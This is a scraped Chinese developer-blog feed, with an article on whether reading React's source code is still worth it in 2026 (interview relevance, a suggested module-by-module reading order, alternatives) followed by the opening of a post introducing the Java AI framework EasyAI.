hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>随着前端技术生态的不断演进，React 作为目前最流行的前端框架之一，已经走过了十多个年头。在 2026 年这个时间节点，很多开发者都在思考一个问题：React 源码还值不值得深入阅读？</p>
<p>这个问题的答案并不是简单的"是"或"否"，而需要从多个维度进行分析。本文将从实际价值、学习成本、技术趋势等角度，为你提供一个全面的分析。</p>
<h2 data-id="heading-0">为什么曾经值得读 React 源码？</h2>
<p>在讨论"现在是否值得"之前，我们先回顾一下为什么 React 源码曾经被认为是值得学习的经典。</p>
<p>React 引入了很多开创性的概念：虚拟 DOM（Virtual DOM）虽然现在已不是新概念，但在当时是一个突破；组件化思想确立了声明式 UI 开发范式；单向数据流成为状态管理的最佳实践；Fiber 架构实现了时间切片和可中断渲染的创新。</p>
<p>React 的代码库以其高质量著称：清晰的代码组织和架构设计、完善的注释和文档、严格的类型检查（使用 Flow，后来迁移到 TypeScript）、丰富的测试覆盖。</p>
<p>阅读 React 源码可以学到大型开源项目的组织方式、性能优化的思路和技巧、复杂状态管理的实现方式，以及设计模式和架构模式的实际应用。</p>
<h2 data-id="heading-1">2026 年的技术环境变化</h2>
<p>到了 2026 年，React 已经非常成熟：API 已经相对稳定，重大变更减少；核心概念已经被广泛理解和应用；生态系统完善，最佳实践明确。</p>
<p>前端技术栈变得更加多样化：Vue 3、Svelte、Solid.js 等框架各有优势；服务端渲染框架（Next.js、Remix、Astro）的兴起；Web Components 的标准化；编译时优化成为趋势（如 React Compiler）。</p>
<p>学习资源也变得更加丰富：大量的教程、视频、文章；官方文档的完善；社区经验的沉淀；AI 辅助学习工具的普及。</p>
<h2 data-id="heading-2">2026 年读 React 源码的利弊分析</h2>
<h3 data-id="heading-3">仍然值得读的理由</h3>
<p>虽然你可以通过文档和教程学会如何使用 React，但阅读源码能让你真正理解 React 的工作原理，而不是表面的 API 使用；理解为什么某些 API 是这样设计的；理解性能优化的底层原理（如 Diff 算法、Fiber 调度）。</p>
<p>当你遇到框架层面的问题时，源码知识能帮助你快速定位问题根源、找到绕过框架限制的方法、为框架贡献代码或参与讨论。</p>
<p>从职业发展角度来看，深入理解 React 源码可以展现技术深度、学习大型项目的架构设计思路、培养阅读复杂代码的能力。</p>
<p>面试仍然是读源码的重要驱动力。打开牛客网等面试平台，你会发现 React 源码相关的面经依然大量存在。大厂面试中，React 源码问题几乎是必问项：Fiber 架构的实现原理、Hooks 的工作机制、Diff 算法的优化策略、事件系统的合成事件机制、调度器的优先级调度原理等等。如果你只能回答 API 的使用，而无法解释底层的实现原理，在面试中很难获得竞争优势。不仅仅是中高级前端开发者的面试，就连秋招和实习面试中也经常出现 React 源码相关的问题，深入理解 React 源码几乎成了标配要求。</p>
<p>在 AI 工具日益普及的 2026 年，一个现实是：即使你不懂 React 原理，也能通过 AI 辅助工具（如 GitHub Copilot、claude code、Cursor 等）完成日常开发工作。AI 可以帮助你生成代码、解决 bug、优化性能。但如果你想要找到一份好的工作，特别是如果你的技术栈是 React，那么最好还是深入理解 React 原理。原因很简单：AI 可以帮你写代码，但不能帮你通过技术面试；AI 可以解决具体问题，但不能替代你对框架的深度理解。在竞争激烈的就业市场中，能够解释 React 底层原理的开发者，明显比只会使用 API 的开发者更有优势。</p>
<p>以下是从牛客网面经中截取的实际面试题目，可以看到 React 原理类问题确实频繁出现：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31c7e7fe065f48bb88a6d43795a549aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=kXP%2BW9KChvEIp0eDdOQdEeblCs4%3D" alt="牛客网 React 面经截图 1" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f3b850e68914dea80ea609435441d5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=YWb%2FmKzuNVnNMohedweVGaW5v5U%3D" alt="牛客网 React 面经截图 2" loading="lazy"/></p>
<p>React 19 引入了很多新特性，值得深入研究：并发渲染（Concurrent Rendering）、自动批处理（Automatic Batching）、Suspense 的完整实现、Transition API、React Compiler、Actions 和 Form 的改进等。</p>
<p>React 源码是学习设计模式的绝佳教材：观察者模式（事件系统）、策略模式（调度器）、适配器模式（各种 renderer）、工厂模式（组件创建）。</p>
<h3 data-id="heading-4">可能不值得读的理由</h3>
<p>React 源码库庞大（超过 10 万行代码），需要大量的时间和精力投入，对于大多数应用开发场景，可能"用不到"这么深的知识。</p>
<p>如果你已经是经验丰富的 React 开发者，读源码的边际收益可能不大，很多概念已经通过其他方式学习到了，实际工作中很少需要深入到框架实现层面。</p>
<p>如果项目使用了其他框架（Vue、Svelte 等），React 源码的学习价值相对降低；如果转向了服务端渲染或边缘计算，客户端框架源码的价值降低。</p>
<p>现在有更多高质量的学习资源（视频教程、互动式课程），可以通过构建简化版 React 来学习核心概念，通过 TypeScript 类型定义也能理解很多设计。</p>
<h2 data-id="heading-5">如何判断你是否应该读 React 源码？</h2>
<p>适合读源码的情况包括：你已经熟练使用 React 进行开发（至少 1-2 年经验）；你遇到了框架层面的问题，需要深入理解才能解决；你想提升技术深度，为职业发展做准备；你即将参加面试，无论是秋招、实习还是社招，特别是大厂面试，React 源码问题几乎是必考点；你对框架设计感兴趣，想要学习架构设计；你想要为 React 贡献代码，或参与相关技术讨论；你是前端技术专家或架构师，需要全面的技术理解。</p>
<p>不太适合读源码的情况包括：React 新手应该先掌握基础使用，再考虑读源码；时间有限的情况下，如果项目压力大，先保证业务能力；如果职业方向不在前端框架，如果转向全栈、后端或移动端，优先级应该调整；如果只做业务开发，工作中不需要深入到框架层面，可能收益不大。</p>
<h2 data-id="heading-6">如果决定读，应该如何读？</h2>
<p>如果你决定要读 React 源码，不要试图一次性读完所有代码，应该按模块学习。</p>
<p>下面这张图是我整理的 React 源码整体阅读流程，用一条清晰的路径把从 JSX 到 Fiber、再到 Scheduler 和 commit 阶段串联在一起。建议你先整体看一遍这张图，对 React 内部的执行链路有个全局认知，再按图中的顺序去对应阅读源码里的关键部分。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71d84a7c513344a18113e0ae2080cecd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=yyaaJY17qt9bFcedx0J6r1yEGoM%3D" alt="20260121200944" loading="lazy"/></p>
<p>结合这张流程图，可以按下面的顺序来读 React 源码：</p>
<ol>
<li>
<p>从使用入口出发：先看 packages/react 中与 JSX 相关的实现（createElement、jsx 等），再看 packages/react-dom 中的 createRoot、render，弄清楚一次渲染是如何被发起的。</p>
</li>
<li>
<p>理解 Fiber 数据结构：在 packages/react-reconciler 中阅读 FiberNode 的定义、createFiber 等代码，搞清楚 Fiber 上都挂了哪些信息，以及它和更新队列的关系。</p>
</li>
<li>
<p>看渲染阶段的工作循环：继续在 react-reconciler 里看 workLoopConcurrent、performUnitOfWork、beginWork、completeWork，对应流程图中「渲染阶段」这部分。</p>
</li>
<li>
<p>单独啃 Scheduler：切到 packages/scheduler，理解任务队列、优先级和时间切片机制，这一块对应流程图中间的调度器节点。</p>
</li>
<li>
<p>回到 commit 阶段：再回到 react-reconciler，看 commitRoot、commitMutationEffects、commitLayoutEffects，弄清楚 DOM 实际在什么时候、以什么顺序被更新。</p>
</li>
<li>
<p>深入 Hooks 实现：重点阅读 useState、useReducer、useEffect 等 Hook 对应的实现文件，结合 Hooks 链表的那部分流程图，理解 hooks 链表如何在 current、workInProgress 之间切换。</p>
</li>
<li>
<p>最后再看 Context、Suspense、并发特性等模块，把前面打下的基础扩展成完整的 React 内部心智模型。</p>
</li>
</ol>
<p>如果你时间不多，建议优先把 1-6 跑通：入口能串起来、Fiber 能看懂、workLoop 能跟住、Scheduler 有概念、commit 知道在干嘛、Hooks 能解释清楚，基本就已经具备“读懂 React 源码”的主干能力。</p>
<p>工具和方法上，建议先把 React 源码仓库拉到本地，在源码里定位关键函数和关键数据结构。</p>
<p>同时搭配 React DevTools 观察组件树和状态变化。真正调试运行时路径时，浏览器里执行的是构建后的 bundle，所以需要开启 Source Map，把断点、调用栈从 bundle 映射回你本地的源码文件，这样你在 DevTools 里跟代码时看到的就是 React 源码而不是编译产物。</p>
<p>遇到数据结构或边界条件不确定，再对照官方文档和 TypeScript 类型定义去校验。</p>
<p>最后，边读边做一个“最小可运行”的简化版 React，再用少量测试用例验证自己的推导，会比纯读更容易形成稳定的心智模型。</p>
<h2 data-id="heading-7">2026 年的新视角：React Compiler 与未来</h2>
<p>到了 2026 年，React 可能已经集成了一些新特性，值得关注。</p>
<p>如果 React Compiler 已经集成到核心，这将是值得深入学习的新内容：编译时优化的思路、静态分析和代码转换、性能优化的新范式。</p>
<p>React 19 的并发特性已经稳定，这些实现值得深入研究：时间切片（Time Slicing）、优先级调度、可中断渲染。</p>
<p>了解 React 如何与新技术整合也很重要：React Server Components、与 WebAssembly 的交互、与 Web Workers 的集成。</p>
<h2 data-id="heading-8">替代学习路径</h2>
<p>如果你觉得读完整源码成本太高，可以考虑这些替代方案。</p>
<p>通过实现一个简化版的 React（如 1000 行左右的代码），你可以学习到核心概念：Virtual DOM、组件系统、Diff 算法、Hooks 基础实现。</p>
<p>只读最核心的部分：Reconciler 的核心逻辑、Hooks 的实现、Scheduler 的调度算法。</p>
<p>React 的 TypeScript 类型定义本身就是很好的文档，可以帮你理解 API 设计思路、数据流、组件生命周期。</p>
<p>关注技术博客和视频：React 团队的官方博客、技术社区的文章、深度解析视频。</p>
<h2 data-id="heading-9">结论与建议</h2>
<p>在 2026 年，React 源码仍然值得读，但不再是"必读项"。</p>
<p>对于大多数开发者，建议优先掌握 React 的使用和最佳实践，通过文档、教程和项目经验提升能力，只在遇到特定问题或想提升深度时，有针对性地阅读相关源码。</p>
<p>对于有追求的开发者，如果你有时间和兴趣，阅读源码绝对是有价值的投资。建议采用"选择性深度阅读"的方式，重点学习核心模块。结合实践项目，通过构建简化版来加深理解。</p>
<p>对于技术专家和架构师，深入理解 React 源码是必要的。这不仅能帮你做出更好的技术决策，还能提升架构设计能力。</p>
<p>技术学习是一个持续的过程，不应该有"一劳永逸"的想法。是否读 React 源码，应该基于你的当前水平、职业目标、项目需求、时间资源。</p>
<p>在 2026 年，我们有更多的学习选择。React 源码仍然是宝贵的学习资源，但它不再是唯一的选择。选择最适合你当前情况的路径，比盲目追求"读完源码"更重要。</p>
<p>无论你是否选择深入阅读 React 源码，保持学习的心态和对技术的热情，比掌握任何特定的技术栈都更重要。技术会变化，但学习能力是永恒的。</p>
<p>如果你读到这里，说明你对 React 源码已经有不小的兴趣，或者正在认真考虑要不要系统地学一遍。最近我刚刚完成了 React 源码的系统学习，并整理成了一个专栏，用大量示意图和流程图来讲清楚 Fiber 架构、Hooks 的内部实现、调度器以及事件系统等关键部分。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d7f7002b42f423c9273125fe7c4c1a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=OUcprCoK9%2Fe2T5hY6KbA7Vr7s6Q%3D" alt="2148a5531fb6563f813d90e0dd467838" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84d367037d4647d1bb23eec2bd2df6e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=ghnbvIiR2xAiYi7LCGTvKVRC01E%3D" alt="3c465d2e2e4b34ff7d851ecb64f30482" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dac993292d44f35a779e1bc118c077f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=KRoTpmH8P%2FkJEgCfFN%2B4Tjy9Qjc%3D" alt="60956e3d526aca95969b8a72bad33364" loading="lazy"/></p>
<p>如果你想用更直观的方式把这些知识真正吃透，欢迎加我微信 <code>yunmz777</code> 私聊，一起交流源码学习的思路和实践经验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[国产 AI 框架 EasyAI：让 Java 程序员用 Java 的方式做 AI]]></title>    <link>https://juejin.cn/post/7597635202324873268</link>    <guid>https://juejin.cn/post/7597635202324873268</guid>    <pubDate>2026-01-21T12:31:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324873268" data-draft-id="7597650624637124608" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="国产 AI 框架 EasyAI：让 Java 程序员用 Java 的方式做 AI"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-21T12:31:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JavaGuide"/> <meta itemprop="url" content="https://juejin.cn/user/166781497383294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            国产 AI 框架 EasyAI：让 Java 程序员用 Java 的方式做 AI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781497383294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JavaGuide
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:31:45.000Z" title="Wed Jan 21 2026 12:31:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>不少 Java 小伙伴私下跟我吐槽：现在 AI 这么火，咱们写 Java 的是不是注定只能在旁边看戏？</p>
<p>说实话，以前确实挺憋屈的。主流 AI 框架全是 Python 的天下（TensorFlow、PyTorch 等），咱们想入个门，不仅要跨过语言鸿沟，还得去趟 CUDA、cuDNN 这种“环境配置地狱”。配环境的时间比写代码还长，这种生态割裂感真的让人头大 。</p>
<p><strong>EasyAI</strong> 的出现正是为了打破这一僵局。它是一个由 Dromara 开源社区维护的<strong>纯 Java 实现</strong>的人工智能框架，主打零依赖、开箱即用，旨在让 Java 程序员能用自己最熟悉的语言开发 AI 应用 。</p>
<p>注意：<strong>EasyAI 和 Spring AI 两者不是同一类东西，解决的问题不一样，后面会提到。</strong></p>
<h2 data-id="heading-0">EasyAI 是什么？</h2>
<p>EasyAI 是一个由 Dromara 开源社区维护的原生 Java 人工智能算法框架 。它的核心定位非常霸气：<strong>让 Java 程序员用 Java 的方式做 AI</strong>。</p>
